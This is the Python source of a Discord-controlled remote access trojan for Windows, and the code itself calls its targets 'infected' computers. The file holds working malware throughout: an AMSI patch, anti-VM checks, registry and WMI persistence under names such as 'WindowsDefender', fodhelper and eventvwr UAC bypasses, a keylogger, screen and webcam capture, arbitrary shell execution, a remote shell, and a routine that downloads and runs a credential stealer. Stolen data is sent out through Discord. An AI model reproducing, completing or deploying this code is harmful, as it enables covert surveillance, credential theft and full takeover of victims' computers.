message = None 
import winreg, aiohttp
import ctypes
import sys
import os
import random
import time
import subprocess
import socket
import threading
import asyncio
import json
import urllib.request
from zipfile import ZipFile
import discord
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
#another place holder
from discord.ext import commands
# placeholder so if token input fails we dont get fucked up (its hard to explain)
# This version makes me proud of myself :p
from ctypes import cast, POINTER, Structure, c_uint, c_int, sizeof, byref, windll
from discord import utils
import requests
import platform
import psutil
import shutil
import base64
import re
import cv2
import pyperclip
from PIL import ImageGrab
from datetime import datetime
from cryptography.fernet import Fernet
from win32com.client import Dispatch

# Adding some junk code to avoid signature detection
_random_str = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(random.randint(10, 20)))
_junk_data = [random.randint(1000, 9999) for _ in range(random.randint(5, 15))]
for _ in range(random.randint(1, 3)):
    _random_str += str(sum(_junk_data) % random.randint(100, 999))

# Dynamic module loading to avoid detection
try:
    import mss
except ImportError:
    pass

try:
    from pynput import keyboard
except ImportError:
    pass

try:
    import pyautogui
except ImportError:
    pass

try:
    import browserhistory
except ImportError:
    pass

try:
    import win32gui
    import win32con
except ImportError:
    pass

try:
    import win32process
except ImportError:
    pass

# AMSI bypass function
def bypass_amsi():
    try:
        if sys.platform != 'win32':
            return
            
        amsi = ctypes.windll.amsi
        address = ctypes.windll.kernel32.GetProcAddress(amsi._handle, "AmsiScanBuffer")
        
        if not address:
            return
            
        old_protection = ctypes.c_ulong(0)
        patch_size = 6
        
        patch_bytes = bytearray([0xB8, 0x57, 0x00, 0x00, 0x00, 0xC3])
            
        ctypes.windll.kernel32.VirtualProtect(
            ctypes.c_void_p(address), 
            patch_size, 
            0x40,
            ctypes.byref(old_protection)
        )
                              
        ctypes.memmove(
            ctypes.c_void_p(address), 
            ctypes.c_void_p(patch_bytes), 
            patch_size
        )
        
        ctypes.windll.kernel32.VirtualProtect(
            ctypes.c_void_p(address), 
            patch_size,
            old_protection.value,
            ctypes.byref(old_protection)
        )
    except:
        pass

# Anti-VM detection
def check_virtual_machine():
    try:
        virtualization_strings = ['vmware', 'virtualbox', 'vbox', 'qemu', 'xen', 'parallels']
        
        for proc in psutil.process_iter(['name']):
            try:
                for v_string in virtualization_strings:
                    if v_string in proc.info['name'].lower():
                        return True
            except:
                pass
                
        try:
            manufacturer = subprocess.check_output('wmic computersystem get manufacturer', shell=True).decode().lower()
            for v_string in virtualization_strings:
                if v_string in manufacturer:
                    return True
        except:
            pass
            
        try:
            reg_paths = [
                r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0",
                r"HARDWARE\Description\System",
                r"SYSTEM\CurrentControlSet\Control\SystemInformation"
            ]
            
            for path in reg_paths:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                    try:
                        value, _ = winreg.QueryValueEx(key, "SystemBiosVersion")
                        for v_string in virtualization_strings:
                            if v_string in value.lower():
                                return True
                    except:
                        pass
                    
                    try:
                        value, _ = winreg.QueryValueEx(key, "Identifier")
                        for v_string in virtualization_strings:
                            if v_string in value.lower():
                                return True
                    except:
                        pass
                except:
                    pass
        except:
            pass
            
        return False
    except:
        return False

# Registry persistence setup
def add_to_startup():
    try:
        exe_path = os.path.abspath(sys.argv[0])
        
        key_paths = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run")
        ]
        
        key_names = ["WindowsDefender", "MicrosoftUpdate", "SystemSecurityService", "RuntimeBroker"]
        key_name = random.choice(key_names)
        
        for hkey, key_path in key_paths:
            try:
                reg_key = winreg.OpenKey(hkey, key_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, exe_path)
                winreg.CloseKey(reg_key)
                return True
            except:
                continue
                
        try:
            if ctypes.windll.shell32.IsUserAnAdmin() != 0:
                command = f'wmic /namespace:"\\\\root\\subscription" path __EventFilter create Name="WindowsEventFilter", EventNameSpace="root\\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"'
                subprocess.run(command, shell=True, capture_output=True)
                
                consumer_command = f'wmic /namespace:"\\\\root\\subscription" path CommandLineEventConsumer create Name="WindowsConsumer", ExecutablePath="{exe_path}",CommandLineTemplate="{exe_path}"'
                subprocess.run(consumer_command, shell=True, capture_output=True)
                
                binding_command = f'wmic /namespace:"\\\\root\\subscription" path __FilterToConsumerBinding create Filter="__EventFilter.Name=\\"WindowsEventFilter\\"", Consumer="CommandLineEventConsumer.Name=\\"WindowsConsumer\\""'
                subprocess.run(binding_command, shell=True, capture_output=True)
                return True
        except:
            pass
            
        return False
    except:
        return False

appdata = os.getenv('APPDATA')
client = discord.Client(intents=discord.Intents.all())
bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

# Token variable that will be replaced by the builder
token = ''  # This will be replaced by the builder

# Run code after we have proper token initialization
def setup_and_run():
    bypass_amsi()
    add_to_startup()
    time.sleep(random.randint(3, 7))
    if check_virtual_machine():
        sys.exit(0)

setup_and_run()

# UAC bypass function
def uac_bypass():
    """Bypass User Account Control to escalate privileges"""
    if ctypes.windll.shell32.IsUserAnAdmin() == 1:
        return True
        
    try:
        # Current executable path
        current_exe = os.path.abspath(sys.argv[0])
        
        # FodHelper method
        fodhelper_path = "Software\\Classes\\ms-settings\\shell\\open\\command"
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, fodhelper_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            # Execute fodhelper to trigger the bypass
            os.system("start C:\\Windows\\System32\\fodhelper.exe")
            time.sleep(2)
            
            # Clean up
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, fodhelper_path)
            except:
                pass
                
            if ctypes.windll.shell32.IsUserAnAdmin() == 1:
                return True
        except:
            pass
            
        # Eventvwr method
        eventvwr_path = "Software\\Classes\\mscfile\\shell\\open\\command"
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, eventvwr_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.CloseKey(key)
            
            # Execute eventvwr to trigger the bypass
            os.system("start C:\\Windows\\System32\\eventvwr.exe")
            time.sleep(2)
            
            # Clean up
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, eventvwr_path)
            except:
                pass
                
            if ctypes.windll.shell32.IsUserAnAdmin() == 1:
                return True
        except:
            pass
            
        # If we get here, bypass failed
        return False
    except:
        return False

HELP_MENU = """
FULL COMMAND EXPLAINATION IN GITHUB README
Availaible commands are :
--> !message =  Syntax  = "!message example"
--> !shell = Syntax  = "!shell whoami"
--> !webcampic = Take a picture from the webcam
--> !windowstart = Start logging current user window (logging is shown in the bot activity)
--> !windowstop = Stop logging current user window
--> !voice =  Syntax = "!voice test"
--> !admincheck = Check if program has admin privileges
--> !sysinfo = Gives info about infected computer
--> !history = Get computer navigation history
--> !download = Download a file from infected computer
--> !upload =  Syntax = "!upload file.png" (with attachment)
--> !cd = Changes directory
--> !write = Type your desired sentence on infected computer
--> !wallpaper =  Syntax = "!wallpaper" (with attachment)
--> !clipboard = Retrieve infected computer clipboard content
--> !geolocate =  Warning : Geolocating IP addresses is not very precise
--> !startkeylogger = Starts a keylogger / Warning : Likely to trigger AV
--> !stopkeylogger = Stops keylogger
--> !dumpkeylogger = Dumps the keylog
--> !volumemax = Put volume at 100%
--> !volumezero = Put volume at 0%
--> !idletime = Get the idle time of user
--> !sing = Play chosen video in background (Only works with youtube links)
--> !stopsing = Stop video playing in background
--> !blockinput = Warning : Admin rights are required
--> !unblockinput =  Warning : Admin rights are required
--> !screenshot = Get the screenshot of the user's current screen
--> !remoteshell = Start a reverse shell that you can connect to
--> !steal = Steals user information including credentials, cookies, and browser data (im working on it)
--> !exit = Exit program
--> !kill = Kill a session or all sessions except current one / Syntax = "!kill session-3" or "!kill all"
"""

# Send help menu to the newly created channel
async def send_help_to_channel(channel):
    await channel.send(HELP_MENU)


stop_threads = False
user_id = None 
channel_name = None
_thread = None
keylogger_running = False
keylogger_task = None
link = None  
pid_process = None 
loop = asyncio.new_event_loop()  
asyncio.set_event_loop(loop)  

async def steal_user_info():
    try:
        global link
        if not link:
            return "Error: Stealer link not configured"
            
        temp_dir = os.environ.get('TEMP')
        exe_path = os.path.join(temp_dir, "hlpr.exe")
        
        # Download the stealer with timeout protection
        try:
            await message.channel.send("[*] Downloading stealer component...")
            await asyncio.wait_for(
                asyncio.to_thread(urllib.request.urlretrieve, link, exe_path),
                timeout=60  # 60 second timeout for download
            )
        except asyncio.TimeoutError:
            return "Error: Download timed out after 60 seconds"
        except Exception as download_error:
            return f"Download error: {str(download_error)}"
            
        # Verify the downloaded file
        if not os.path.exists(exe_path) or os.path.getsize(exe_path) < 10000:
            return "Error: Downloaded file is invalid or too small"
            
        # Execute the stealer with timeout protection
        try:
            await message.channel.send("[*] Executing stealer component...")
            process = await asyncio.create_subprocess_shell(
                exe_path, 
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            # Wait for completion with timeout
            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=300)  # 5 minute timeout
                
                if process.returncode != 0:
                    error_output = stderr.decode(errors='replace') if stderr else "Unknown error"
                    return f"Stealer execution failed with code {process.returncode}: {error_output}"
                    
                return "Stealer executed successfully. Data will be sent automatically."
            except asyncio.TimeoutError:
                # Kill the process if it takes too long
                try:
                    process.kill()
                except:
                    pass
                return "Error: Stealer execution timed out after 5 minutes"
                
        except Exception as exec_error:
            return f"Execution error: {str(exec_error)}"
        
    except Exception as e:
        return f"Error: {str(e)}"
        
    finally:
        # Clean up the executable file
        try:
            if os.path.exists(exe_path):
                os.remove(exe_path)
        except:
            pass

async def start_reverse_shell(port=0):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # Set socket timeout to prevent blocking indefinitely
        server.settimeout(60)  # 60 second timeout for accept()
        server.bind(('0.0.0.0', port))
        server.listen(5)
        
        _, port = server.getsockname()
        
        # Get IP address with timeout protection
        ip = "127.0.0.1"  # Default fallback
        try:
            # Try first service with short timeout
            ip_response = await asyncio.wait_for(
                asyncio.to_thread(requests.get, 'https://api.ipify.org/?format=text', timeout=3), 
                timeout=5
            )
            ip = ip_response.text.strip()
        except:
            try:
                # Try second service if first fails
                ip_response = await asyncio.wait_for(
                    asyncio.to_thread(requests.get, 'https://ifconfig.me/ip', timeout=3),
                    timeout=5
                )
                ip = ip_response.text.strip()
            except:
                # Use fallback if all services fail
                try:
                    # Try to get the local IP as a last resort
                    hostname = socket.gethostname()
                    ip = socket.gethostbyname(hostname)
                except:
                    pass  # Keep default 127.0.0.1
                    
        return server, ip, port
    except Exception as e:
        print(f"Error starting reverse shell: {str(e)}")
        return None, None, None

async def handle_client(client_socket, channel):
    # Set socket timeout
    client_socket.settimeout(300)  # 5 minute timeout for socket operations
    
    # Set up shell based on OS
    shell_cmd = 'powershell.exe' if os.name == 'nt' else '/bin/sh'
    shell_args = [] if os.name == 'nt' else ['-i']
    
    try:
        # Start subprocess with timeouts
        shell = await asyncio.wait_for(
            asyncio.create_subprocess_exec(
                shell_cmd, *shell_args,
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            ),
            timeout=10  # 10 second timeout for process creation
        )
        
        # Task to handle socket-to-shell communication
        async def socket_to_shell():
            try:
                read_buffer = b''
                while True:
                    try:
                        # Read data with timeout
                        chunk = await asyncio.wait_for(
                            asyncio.to_thread(client_socket.recv, 4096),
                            timeout=60  # 60 second timeout for each receive
                        )
                        if not chunk:
                            break
                            
                        read_buffer += chunk
                        
                        # Process complete commands (ending with newline)
                        if b'\n' in read_buffer:
                            lines = read_buffer.split(b'\n')
                            # Keep the last incomplete line in the buffer
                            read_buffer = lines[-1]
                            # Process all complete lines
                            for line in lines[:-1]:
                                if shell.stdin:
                                    shell.stdin.write(line + b'\n')
                                    await shell.stdin.drain()
                    except asyncio.TimeoutError:
                        # Send a heartbeat to keep connection alive
                        if channel:
                            await channel.send("[*] Shell connection idle for 60 seconds")
                        continue
                    except Exception as e:
                        if channel:
                            await channel.send(f"[!] Socket-to-shell error: {str(e)}")
                        break
            except Exception as outer_e:
                if channel:
                    await channel.send(f"[!] Socket-to-shell outer error: {str(outer_e)}")
            finally:
                # Ensure stdin is closed
                if shell.stdin:
                    shell.stdin.close()
        
        # Task to handle shell-to-socket communication
        async def shell_to_socket():
            try:
                while True:
                    try:
                        # Read output from shell with timeout
                        output = await asyncio.wait_for(shell.stdout.readline(), timeout=60)
                        if not output:
                            error = await asyncio.wait_for(shell.stderr.readline(), timeout=5)
                            if not error:
                                break
                            await asyncio.to_thread(client_socket.send, error)
                        else:
                            await asyncio.to_thread(client_socket.send, output)
                    except asyncio.TimeoutError:
                        # No output for 60 seconds, but keep running
                        continue
                    except Exception as e:
                        if channel:
                            await channel.send(f"[!] Shell-to-socket error: {str(e)}")
                        break
            except Exception as outer_e:
                if channel:
                    await channel.send(f"[!] Shell-to-socket outer error: {str(outer_e)}")
            finally:
                # Try to terminate the shell process if it's still running
                try:
                    if shell and shell.returncode is None:
                        shell.terminate()
                except:
                    pass
        
        # Run both communication directions with cancellation support
        s2s_task = asyncio.create_task(socket_to_shell())
        s2c_task = asyncio.create_task(shell_to_socket())
        
        # Wait for both tasks and handle cancellation
        done, pending = await asyncio.wait(
            [s2s_task, s2c_task],
            return_when=asyncio.FIRST_COMPLETED
        )
        
        # Cancel pending tasks
        for task in pending:
            task.cancel()
            
        if channel:
            await channel.send("[*] Remote shell connection closed")
            
    except Exception as e:
        if channel:
            await channel.send(f"[!] Error in shell session: {str(e)}")
    finally:
        # Clean up resources
        try:
            client_socket.close()
        except:
            pass
        
        try:
            if shell and shell.returncode is None:
                shell.terminate()
        except:
            pass

async def activity(client_instance):
    try:
        import win32gui
        while True:
            global stop_threads
            if stop_threads:
                break
            try:
                window = await asyncio.to_thread(win32gui.GetWindowText, win32gui.GetForegroundWindow())
                game = discord.Game(f"Visiting: {window}")
                await client_instance.change_presence(status=discord.Status.online, activity=game)
            except:
                pass
            await asyncio.sleep(1)
    except ImportError:
        await client_instance.change_presence(status=discord.Status.online, activity=discord.Game("win32gui not available"))

async def between_callback(client_instance):
    await activity(client_instance)

@client.event
async def on_ready():
    import platform
    import urllib.request
    import json
    
    flag = 'unknown'
    ip = '0.0.0.0'
    error_message = None
    
    geolocation_services = [
        {"url": "https://geolocation-db.com/json", "ip_key": "IPv4", "country_key": "country_code"},
        {"url": "https://ipinfo.io/json", "ip_key": "ip", "country_key": "country"},
        {"url": "https://api.ipify.org/?format=json", "ip_key": "ip", "country_key": None}
    ]
    
    for service in geolocation_services:
        try:
            data = await asyncio.to_thread(lambda: json.loads(urllib.request.urlopen(service["url"], timeout=3).read().decode()))
            
            if service["ip_key"] in data:
                ip = data[service["ip_key"]]
            
            if service["country_key"] and service["country_key"] in data:
                flag = data[service["country_key"]]
            
            if ip != '0.0.0.0' and flag == 'unknown' and service["country_key"] is None:
                try:
                    country_data = await asyncio.to_thread(lambda: json.loads(urllib.request.urlopen(f"https://ipinfo.io/{ip}/json", timeout=3).read().decode()))
                    if "country" in country_data:
                        flag = country_data["country"]
                except Exception as e:
                    error_message = f"Got IP but couldn't get country: {str(e)}"
            
            if ip != '0.0.0.0' and flag != 'unknown':
                break
                    
        except Exception as e:
            error_message = f"Error with {service['url']}: {str(e)}"
            continue
    
    global user_id, channel_name
    user_id = f"{random.randint(10000, 99999)}"
    channel_name = f"hi-{user_id}"
    
    for guild in client.guilds:
        newchannel = await guild.create_text_channel(channel_name)
        channel = client.get_channel(newchannel.id)
        
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        value1 = (f"@everyone New connection {channel_name} | {platform.system()} "
                 f"{platform.release()} | {ip} :flag_{flag.lower()}: | User : {os.getlogin()}")
        
        await channel.send(f'{value1} | :gem:' if is_admin else value1)
        
        if error_message:
            await channel.send(f"[!] Geolocation note: {error_message}")
    
    game = discord.Game("Window logging stopped")
    await client.change_presence(status=discord.Status.online, activity=game)
    
async def volumeup():
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        if volume.GetMute() == 1:
            volume.SetMute(0, None)
        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
    except:
        pass

async def volumedown():
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
    except:
        pass

async def start_keylogger():
    try:
        from pynput import keyboard
        
        global keylogger_running, keylogger_thread
        
        if keylogger_running:
            return "Keylogger is already running"
        
        temp = os.getenv("TEMP")
        log_file = os.path.join(temp, "klg.tmp")
        
        def on_press(key):
            # Check flag immediately to allow quick termination
            if not keylogger_running:
                return False
                
            try:
                with open(log_file, "a", encoding="utf-8") as f:
                    try:
                        f.write(key.char)
                    except AttributeError:
                        if key == keyboard.Key.space:
                            f.write(" ")
                        elif key == keyboard.Key.enter:
                            f.write("\n")
                        elif key == keyboard.Key.backspace:
                            f.write("[BKSP]")
                        elif key == keyboard.Key.tab:
                            f.write("[TAB]")
                        else:
                            f.write(f"[{str(key).upper()}]")
            except:
                pass
            
            # Re-check to allow quicker termination
            return keylogger_running
        
        def keylogger_function():
            # Use non-blocking listener to allow clean termination
            listener = keyboard.Listener(on_press=on_press, suppress=False)
            listener.start()
            
            # Check every second if we should stop
            stop_check_interval = 1.0
            try:
                while keylogger_running:
                    time.sleep(stop_check_interval)
                    
                # Explicitly stop the listener when flag is cleared
                listener.stop()
            except:
                # Ensure listener is stopped even on exception
                try:
                    listener.stop()
                except:
                    pass
        
        # Initialize log file
        with open(log_file, "w", encoding="utf-8") as f:
            f.write("=== Keylogger Started ===\n")
            
        keylogger_running = True
        keylogger_thread = threading.Thread(target=keylogger_function, daemon=True)
        keylogger_thread.start()
        
        return "Keylogger started successfully"
    except ImportError:
        return "Error: pynput module not installed"
    except Exception as e:
        return f"Error starting keylogger: {str(e)}"

async def stop_keylogger():
    global keylogger_running, keylogger_thread
    
    if not keylogger_running:
        return "Keylogger is not running"
        
    try:
        # Set the flag to stop
        keylogger_running = False
        
        # Wait for thread to terminate (max 3 seconds)
        if keylogger_thread and keylogger_thread.is_alive():
            for _ in range(30):  # 30 x 0.1s = 3 seconds max wait
                if not keylogger_thread.is_alive():
                    break
                await asyncio.sleep(0.1)
        
        # Clean up files
        temp = os.getenv("TEMP")
        log_file = os.path.join(temp, "klg.tmp")
        dump_file = os.path.join(temp, "key_log.txt")
        
        try:
            # Copy log to dump file
            if os.path.exists(log_file):
                await asyncio.to_thread(shutil.copy2, log_file, dump_file)
                
                # Clear the log file
                with open(log_file, 'w', encoding='utf-8') as f:
                    f.write("=== Keylogger Stopped ===\n")
        except Exception as e:
            return f"Keylogger stopped, but error handling files: {str(e)}"
            
        return "Keylogger stopped successfully"
    except Exception as e:
        return f"Error stopping keylogger: {str(e)}"

@client.event
async def on_message(message):
    global channel_name, keylogger_running, pid_process
    
    if not hasattr(message.channel, 'name') or message.channel.name != channel_name:
        return
    
    if message.author == client.user:
        return

    elif message.content == "!remoteshell":
        try:
            port = random.randint(10000, 65000)
            server, ip, port = await start_reverse_shell(port)
            if server:
                await message.channel.send(f"[*] Remote shell started on {ip}:{port}")
                await message.channel.send(
                    f"[*] Connect with: `nc {ip} {port}` or any other TCP client")
                
                async def accept_connections():
                    try:
                        # Set a maximum lifetime for the server
                        max_server_lifetime = 3600  # 1 hour
                        start_time = time.time()
                        
                        # Track active connections
                        active_connections = set()
                        
                        while time.time() - start_time < max_server_lifetime:
                            try:
                                # Accept connections with timeout
                                client_socket, client_address = await asyncio.wait_for(
                                    asyncio.to_thread(server.accept),
                                    timeout=60  # 60 second timeout for accept
                                )
                                
                                await message.channel.send(f"[*] New connection from {client_address[0]}:{client_address[1]}")
                                
                                # Start client handler
                                handler_task = asyncio.create_task(
                                    handle_client(client_socket, message.channel)
                                )
                                
                                # Add to active connections
                                active_connections.add(handler_task)
                                
                                # Clean up completed tasks
                                for task in list(active_connections):
                                    if task.done():
                                        active_connections.remove(task)
                                        
                            except asyncio.TimeoutError:
                                # Accept timed out, just continue
                                continue
                            except Exception as conn_error:
                                await message.channel.send(f"[!] Connection error: {str(conn_error)}")
                                # Short pause to avoid rapid retries on persistent errors
                                await asyncio.sleep(1)
                                
                        # Server lifetime exceeded
                        await message.channel.send("[!] Remote shell server lifetime exceeded (1 hour). Shutting down.")
                        
                    except Exception as e:
                        await message.channel.send(f"[!] Server error: {str(e)}")
                    finally:
                        # Clean up server
                        try:
                            server.close()
                            await message.channel.send("[*] Remote shell server closed")
                        except:
                            pass
                
                # Start the connection acceptor
                asyncio.create_task(accept_connections())
            else:
                await message.channel.send("[!] Failed to start remote shell")
        except Exception as e:
            await message.channel.send(f"[!] Error starting remote shell: {str(e)}")

    elif message.content == "!startkeylogger":
        try:
            result = await start_keylogger()
            await message.channel.send(f"[*] {result}")
        except Exception as e:
            await message.channel.send(f"[!] Error starting keylogger: {str(e)}")
            
    elif message.content == "!stopkeylogger":
        try:
            result = await stop_keylogger()
            await message.channel.send(f"[*] {result}")
        except Exception as e:
            await message.channel.send(f"[!] Error stopping keylogger: {str(e)}")
    elif message.content == "!dumpkeylogger":
        try:
            temp = os.getenv("TEMP")
            file_keys = os.path.join(temp, "klg.tmp")
            if os.path.exists(file_keys):
                file = discord.File(file_keys, filename="keylog.txt")
                await message.channel.send("[*] Command successfully executed", file=file)
                await asyncio.to_thread(os.remove, file_keys)
            else:
                await message.channel.send("[!] No keylog file found")
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")

    elif message.content == "!exit":
        try:
            await message.channel.send("[*] Exiting...")
            sys.exit(0)
        except:
            sys.exit(0)

    elif message.content == "!windowstart":
        try:
            global stop_threads
            stop_threads = False
            global _thread
            _thread = threading.Thread(target=between_callback, args=(client,))
            _thread.daemon = True
            _thread.start()
            await message.channel.send("[*] Window logging for this session started")
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")
    elif message.content == "!windowstop":
        try:
            stop_threads = True
            game = discord.Game("Window logging stopped")
            await client.change_presence(status=discord.Status.online, activity=game)
            await message.channel.send("[*] Window logging for this session stopped")
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")

    elif message.content == "!screenshot":
        try:
            if 'mss' not in sys.modules:
                await message.channel.send("[!] Error: mss module not installed")
                return
                
            from mss import mss
            temp_file = os.path.join(os.getenv('TEMP'), f"screen_{random.randint(1000, 9999)}.png")
            with mss() as sct:
                sct.shot(output=temp_file)
            file = discord.File(temp_file, filename="screenshot.png")
            await message.channel.send("[*] Command successfully executed", file=file)
            os.remove(temp_file)
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")

    elif message.content == "!volumemax":
        await asyncio.to_thread(volumeup)
        await message.channel.send("[*] Volume put to 100%")

    elif message.content == "!volumezero":
        await asyncio.to_thread(volumedown)
        await message.channel.send("[*] Volume put to 0%")

    elif message.content == "!webcampic":
        try:
            import os
            import urllib.request
            from zipfile import ZipFile
            
            await message.channel.send("[*] Attempting to capture webcam image...")
            
            # Remember current directory
            directory = os.getcwd()
            temp_dir = os.getenv('TEMP')
            os.chdir(temp_dir)
            
            # Generate unique filenames
            zip_file = f"wcam_{random.randint(1000, 9999)}.zip"
            img_file = f"img_{random.randint(1000, 9999)}.png"
            
            try:
                # Download webcam tool with timeout
                await message.channel.send("[*] Downloading webcam capture tool...")
                await asyncio.wait_for(
                    asyncio.to_thread(
                        urllib.request.urlretrieve, 
                        "https://www.nirsoft.net/utils/webcamimagesave.zip", 
                        zip_file
                    ),
                    timeout=30  # 30 second timeout for download
                )
                
                # Extract the zip file
                with ZipFile(zip_file) as zip_obj:
                    zip_obj.extractall()
                
                # Capture image with timeout
                await message.channel.send("[*] Capturing image from webcam...")
                capture_process = await asyncio.create_subprocess_shell(
                    f"WebCamImageSave.exe /capture /FileName {img_file}",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                # Wait for capture with timeout
                try:
                    await asyncio.wait_for(capture_process.wait(), timeout=15)
                except asyncio.TimeoutError:
                    # Kill the process if it takes too long
                    capture_process.kill()
                    await message.channel.send("[!] Webcam capture timed out after 15 seconds")
                    raise Exception("Webcam capture timed out")
                
                # Check if image was captured successfully
                if os.path.exists(img_file) and os.path.getsize(img_file) > 0:
                    file = discord.File(img_file, filename="webcam.png")
                    await message.channel.send("[*] Webcam image captured successfully", file=file)
                else:
                    await message.channel.send("[!] Failed to capture webcam image - no camera or access denied")
            except asyncio.TimeoutError:
                await message.channel.send("[!] Operation timed out")
            except Exception as inner_e:
                await message.channel.send(f"[!] Error during webcam capture: {str(inner_e)}")
            finally:
                # Clean up files regardless of success or failure
                cleanup_files = [zip_file, img_file, "WebCamImageSave.exe", "readme.txt", "WebCamImageSave.chm"]
                for f in cleanup_files:
                    try:
                        if os.path.exists(f):
                            os.remove(f)
                    except:
                        pass
                
                # Restore original directory
                os.chdir(directory)
                
        except Exception as e:
            await message.channel.send(f"[!] Command failed: {str(e)}")
            # Try to restore directory if changed
            try:
                if 'directory' in locals():
                    os.chdir(directory)
            except:
                pass

    elif message.content.startswith("!message"):
        try:
            if 'win32gui' not in sys.modules or 'win32con' not in sys.modules:
                await message.channel.send("[!] Error: win32gui or win32con modules not installed")
                return
                
            import win32con
            import win32gui
            
            mb_yesno = 0x04
            mb_help = 0x4000
            icon_stop = 0x10
            
            def mess():
                ctypes.windll.user32.MessageBoxW(0, message.content[8:], "Error", mb_help | mb_yesno | icon_stop)
                
            threading.Thread(target=mess, daemon=True).start()
            
            await asyncio.sleep(1)
            hwnd = win32gui.FindWindow(None, "Error")
            if hwnd:
                win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0,
                                      win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0,
                                      win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0,
                                      win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                
            await message.channel.send("[*] Message displayed")
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")

    elif message.content.startswith("!wallpaper"):
        try:
            if message.attachments:
                path = os.path.join(os.getenv('TEMP'), f"wp_{random.randint(1000, 9999)}.jpg")
                await message.attachments[0].save(path)
                await asyncio.to_thread(ctypes.windll.user32.SystemParametersInfoW, 20, 0, path, 0)
                await message.channel.send("[*] Command successfully executed")
            else:
                await message.channel.send("[!] No image attached")
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")

    elif message.content.startswith("!upload"):
        try:
            if message.attachments:
                filename = message.content[8:].strip() or message.attachments[0].filename
                await message.attachments[0].save(filename)
                await message.channel.send(f"[*] File saved as {filename}")
            else:
                await message.channel.send("[!] No file attached")
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")

    elif message.content.startswith("!shell"):
        try:
            instruction = message.content[7:]
            
            async def execute_shell_command():
                try:
                    process = await asyncio.create_subprocess_shell(
                        instruction,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                        stdin=asyncio.subprocess.PIPE
                    )
                    stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=30)
                    return stdout.decode(errors='replace'), stderr.decode(errors='replace')
                except asyncio.TimeoutError:
                    return "Command timed out after 30 seconds", ""
                except Exception as e:
                    return "", str(e)
            
            stdout, stderr = await execute_shell_command()
            result = stdout or stderr
            
            if not result:
                await message.channel.send("[*] Command executed but returned no output")
                return
                
            if len(result) > 1990:
                temp_file = os.path.join(os.getenv('TEMP'), f"output_{random.randint(1000, 9999)}.txt")
                with open(temp_file, 'w', encoding='utf-8') as f:
                    f.write(result)
                file = discord.File(temp_file, filename="command_output.txt")
                await message.channel.send("[*] Command output", file=file)
                os.remove(temp_file)
            else:
                await message.channel.send(f"[*] Output:\n```\n{result}\n```")
                
        except Exception as e:
            await message.channel.send(f"[!] Error executing command: {str(e)}")

    elif message.content.startswith("!download"):
        try:
            filepath = message.content[10:]
            if os.path.exists(filepath):
                file = discord.File(filepath, filename=os.path.basename(filepath))
                await message.channel.send("[*] File downloaded", file=file)
            else:
                await message.channel.send(f"[!] File not found: {filepath}")
        except Exception as e:
            await message.channel.send(f"[!] Error: {str(e)}")

